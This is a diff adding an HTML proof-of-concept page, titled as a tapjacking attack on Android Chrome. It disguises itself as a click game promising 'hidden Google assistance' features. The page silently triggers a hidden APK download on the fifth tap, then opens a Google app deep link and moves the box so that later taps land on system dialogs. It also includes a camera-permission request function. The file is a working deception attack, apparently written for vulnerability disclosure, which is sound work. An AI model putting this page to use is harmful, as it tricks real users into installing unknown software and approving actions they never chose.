@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Tapjacking Android Chrome POC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      user-select: none;
+    }
+
+    #redBox {
+      position: absolute;
+      top: 400px;
+      left: 300px;
+      width: 30px;
+      height: 30px;
+      background-color: red;
+      cursor: pointer;
+    }
+
+    #counter, #first {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 40px;
+    }
+  </style>
+  <script>
+        function requestCameraPermission() {
+      // Get access to the camera
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function (stream) {
+          console.log('Camera permission granted.');
+        })
+        .catch(function (error) {
+          console.error('Error accessing the camera:', error);
+        });
+    }
+
+    var clickCount = 0;
+
+    function handleClick() {
+      clickCount++;
+      document.getElementById("counter").innerHTML = "x" + clickCount;
+
+      if (clickCount == 5) {
+        document.getElementById("download").click();
+      }
+      if (clickCount == 6) {
+        setTimeout(function() {
+          window.open('googleapp://deeplink/?data=CkwBDb3mGzBFAiEAic8-0un3nRrMa_hkMUV9fj_zD09xhu9D6xTXEsFSRPICIEJlWlJRSqv3afrbX9J8BZa_h3sAfF8NSDFAlLSj10MUEjkKAggAEgIIbxoQEg4IBBIK6oqo9AQECAFAACIdChtodHRwOi8vYXNzaXN0YW50Lmdvb2dsZS5jb20');
+
+    }, 500);
+      document.getElementById("counter").innerHTML = "Now click the green box x2 to win!";
+      document.getElementById("redBox").style.top = '35px';
+      document.getElementById("redBox").style.backgroundColor = 'Green';
+
+      }
+    }
+
+    function startGame() {
+      document.getElementById("game").style.display = "block";
+      document.getElementById("first").style.display = "none";
+    }
+    
+  </script>
+</head>
+<body>
+  <center id="first" style="padding: 15px;">
+    <button onclick="startGame()">Click to unlock hidden Google assistance Festures</button>
+  </center>
+  <a href="test.apk" download="game.apk" id="download" hidden>Download APK</a>
+
+  <div id="game" style="display: none;">
+    <div id="redBox" onclick="handleClick()"></div>
+    <div id="counter">Click the Red Box x6 to win!</div>
+  </div>
+
+</body>
+
+</html>
